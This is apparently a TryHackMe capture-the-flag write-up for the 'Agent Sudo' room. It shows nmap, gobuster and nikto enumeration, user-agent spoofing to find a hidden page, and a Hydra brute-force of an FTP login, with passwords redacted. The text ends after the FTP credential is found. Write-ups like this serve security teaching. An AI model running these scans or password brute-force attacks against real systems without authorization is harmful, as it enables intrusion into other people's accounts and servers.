# Agent Sudo
> 4lch3my | March 08, 2023
-------------------
#### You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
#### [Room Link](https://tryhackme.com/room/agentsudoctf)

## Tasks
##### 1. Author note
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.
<br>

##### 2.  Enumerate

 To start, I will use [nmap] which is default option on the personal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A uses agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 19:21 CET
Nmap scan report for MACHINE_IP
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef1f5d04d47795066072ecf058f2cc07 (RSA)
|   256 5e02d19ac4e7430662c19e25848ae7ea (ECDSA)
|_  256 2d005cb9fda8c8d880e3924f8b4f18e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds
```
OK, so we see there are 3 ports open: `21 - FTP, 22 - SSH & 80 - HTTP`. Time to run gobuster to see what directorys we have on `port 80`: `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`:

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://MACHINE_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/07 19:25:25 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
Progress: 220496 / 220561 (99.97%)
===============================================================
2023/03/07 19:44:52 Finished
===============================================================
```
Hmmm, interesting... It seems like we do not see any folders discovered by `gobuster`. We can also run Nikto while we are at it: `nikto -h http://MACHINE_IP/`

```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          MACHINE_IP
+ Target Hostname:    MACHINE_IP
+ Target Port:        80
+ Start Time:         2023-03-07 19:38:32 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8046 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-03-07 19:45:46 (GMT1) (434 seconds)
---------------------------------------------------------------------------
```
This does not result in anything either. I guess it's time to visit the webpage it self.
<br>

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/page.png?raw=true)

Ahhh, so we need to use a custom user-agent to enter the "secret" page. I'm personally using Chrome and following along [THIS GUIDE](https://www.searchenginejournal.com/change-user-agent/368448/) on how to change the user-agent. For me it will be: `Inspect > More Tools > Network Conditions`, here I can deselect: `Use browser default`, add `Custom` and add the agent I want to use. The text on the website is signed by `Agent R`, so let's start with `R` nad refresh the page.

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/agent_r.png?raw=true)

Finally, we are getting somewhere. On the page we see `Are you one of the 25 employees?` what suspiciopusly reminds us of the English alphabet (yes, 26 letters, but maybe R is already used here?). 
<br> 

Let's start with the letter `A`. Nothing. Letter `B`. Nothing. Letter `C`. There we go: 

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Agent%20Sudo/images/agent_c.png?raw=true)

We have found the hidden webpage: `http://MACHINE_IP/agent_C_[REDACTED].php` where we can see a username finally: `chris`. Time to brute force!
<br> 

##### 2. Hash cracking and brute-force

Starting off with `FTP`. Using our trusty old tool `Hydra` we can start the process with ease: `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://MACHINE_IP`:

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-07 20:20:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://MACHINE_IP:21/
[21][ftp] host: 10.10.233.10   login: chris   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 20:21:00
```
Only in a few minuites we where able to find the `password` for the user `chris`. On to login-in to `SSH`.
<br> 

